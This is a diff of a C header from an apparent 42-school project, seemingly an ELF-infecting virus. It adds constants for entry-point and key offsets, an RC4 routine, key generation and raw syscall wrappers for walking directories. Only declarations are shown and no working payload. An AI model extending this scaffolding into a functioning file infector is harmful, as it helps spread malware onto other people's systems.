@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/26 17:59:33 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/03/27 20:18:12 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -33,18 +33,25 @@
 # define USER_ENTRY	2
 # define ROOT_ENTRY	4
 # define BUFF_SIZE	4096
-# define OFFSET		1461
+# define ENTRY_OFF	1912
+
+# define KEY_OFF	85
+# define KEY_SIZE	16
+
+# define PROG_ENTRY	3
+# define PROG_INFO	512
+
 
 # define __INLINE__	__attribute__((always_inline)) inline
 
 /* Structures */
 typedef struct __attribute__ ((__packed__)) linux_dirent64
 {
-	__ino64_t			d_ino;          /* 64-bit inode number */
-	__off64_t			d_off;          /* 64-bit offset to next structure */
-	unsigned short int	d_reclen;       /* Size of this dirent */
-	unsigned char		d_type;         /* File type */
-	char				d_name[256];    /* Filename (null-terminated) */
+	__ino64_t			d_ino;
+	__off64_t			d_off;
+	unsigned short int	d_reclen;
+	unsigned char		d_type;
+	char				d_name[256];
 }						linux_dirent64;
 
 typedef struct	s_directory
@@ -97,6 +104,7 @@ typedef struct	s_data
 	Elf64_Addr	cpr_entry;
 
 	void		*rsp;
+	char		cpr_key[KEY_SIZE];
 	size_t		context;
 }				t_data;
 
@@ -116,10 +124,12 @@ void			end(void);
 /*
 **	Misc
 */
+void			_rc4(const unsigned char *key, const size_t key_length, uint8_t *data, const size_t data_length);
 void			update_one(t_key *key, char *ptr, size_t size);
 void			update_two(t_key *key, char *ptr, size_t size);
 void			revert_one(t_key *key, char *ptr, size_t size);
 void			revert_two(t_key *key, char *ptr, size_t size);
+bool			generate_key(uint8_t *key, size_t size);
 
 /*
 **	Lib
@@ -128,6 +138,7 @@ void			*_memcpy(void *d, void *s, size_t size);
 void			*_memset(void *b, int c, size_t len);
 int				_strncmp(char *s1, char *s2, size_t n);
 size_t			_strlen(char *s);
+void			__exit(int status);
 int				_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 int				_open(const char *path, int flags, mode_t mode);
 int				_fstat(int fd, struct stat *statbuf);
